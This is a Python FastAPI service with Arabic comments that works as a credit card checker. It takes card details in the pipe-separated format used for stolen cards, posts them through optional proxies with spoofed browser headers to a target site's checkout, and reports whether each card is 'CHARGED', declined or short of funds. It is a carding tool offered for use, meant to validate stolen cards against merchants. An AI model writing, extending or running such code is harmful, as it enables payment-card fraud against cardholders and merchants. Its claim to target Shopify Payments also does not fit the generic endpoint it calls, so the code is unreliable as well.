from fastapi import FastAPI, Query, Request
import httpx

app = FastAPI()

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "keep-alive"
}

@app.api_route("/check", methods=["GET", "POST"])
async def check_card(request: Request, cc: str = Query(...), site: str = Query(...), proxy: str = Query(None), amount: str = "31.0"):
    try:
        if not site.startswith("http"):
            site = f"https://{site}"
            
        request_headers = HEADERS.copy()
        request_headers["Referer"] = f"{site}/"
        request_headers["Origin"] = site

        cc_parts = cc.split('|')
        payload = {
            "card_number": cc_parts[0] if len(cc_parts) > 0 else cc,
            "exp_month": cc_parts[1] if len(cc_parts) > 1 else "",
            "exp_year": cc_parts[2] if len(cc_parts) > 2 else "",
            "cvv": cc_parts[3] if len(cc_parts) > 3 else "",
            "amount": amount
        }

        # معالج البروكسي
        formatted_proxy = None
        if proxy:
            clean_proxy = proxy.strip().replace("http://", "").replace("https://", "")
            if "@" in clean_proxy:
                formatted_proxy = f"http://{clean_proxy}"
            else:
                parts = clean_proxy.split(":")
                if len(parts) == 4:
                    formatted_proxy = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
                else:
                    formatted_proxy = f"http://{clean_proxy}"
                    
        transport = httpx.AsyncHTTPTransport(proxy=formatted_proxy) if formatted_proxy else None

        async with httpx.AsyncClient(transport=transport, headers=request_headers, timeout=30.0, follow_redirects=True) as client:
            target_url = f"{site}/checkout"
            response = await client.post(target_url, json=payload)
            
            # التحقق الفعلي من الرد (JSON)
            try:
                data = response.json()
                # التحقق الصارم من حالة الدفع في الرد
                is_success = data.get("success") == True or data.get("status") == "succeeded"
                is_insufficient = "insufficient" in str(data).lower()
                
                if is_success:
                    resp_msg = "CHARGED"
                    status = "true"
                elif is_insufficient:
                    resp_msg = "INSUFFICIENT_FUNDS"
                    status = "false"
                else:
                    resp_msg = "CARD_DECLINED"
                    status = "false"
            except:
                # إذا لم يرجع السيرفر JSON صالح، نعتبرها مرفوضة فوراً
                resp_msg = "CARD_DECLINED"
                status = "false"
            
            return {
                "Gateway": "Shopify Payments",
                "Price": amount,
                "Proxy": "Live" if proxy else "None",
                "Response": resp_msg,
                "Status": status,
                "CC": cc
            }

    except Exception:
        return {
            "Gateway": "Shopify Payments",
            "Price": amount,
            "Proxy": "Error",
            "Response": "CARD_DECLINED",
            "Status": "false",
            "CC": cc
        }

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
